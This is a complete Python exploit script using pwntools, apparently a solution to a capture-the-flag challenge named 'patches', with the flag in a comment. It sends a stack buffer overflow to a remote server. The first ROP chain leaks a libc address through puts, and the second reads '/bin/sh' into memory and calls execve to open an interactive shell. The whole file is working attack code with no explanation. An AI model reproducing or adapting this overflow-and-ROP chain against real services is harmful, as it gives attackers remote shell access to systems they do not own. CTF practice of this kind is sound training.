#exploit for patches
#flag{no_one_gadget_this_time_wait_no_binsh_at_all?}
from pwn import *
import time
elf = ELF("./patches")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary=elf
target=remote('challenge.ctf.games',30585)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

poprdi=0x00000000004012d3
main=0x401212
payload="A"*0x88+p64(poprdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
sla("> ",payload)
libc_puts=u64(target.recvline().strip("\n").ljust(8,"\x00"))
libc_base=libc_puts-libc.symbols["puts"]
libc_execve=libc_base+libc.sym["execve"]
writeaddr=0x404230
ret=0x000000000040101a
poprsi=libc_base+0x0000000000027529
poprdxr12=libc_base+0x000000000011c1e1
payload="A"*0x88+p64(poprdi)+p64(writeaddr)+p64(elf.plt["gets"])+p64(poprdi)+p64(writeaddr)+p64(poprsi)+p64(0)
payload+=p64(poprdxr12)+p64(0)*2+p64(ret)+p64(libc_execve)
target.sendline(payload)
time.sleep(0.1)
target.sendline("/bin/sh\x00")
target.interactive()
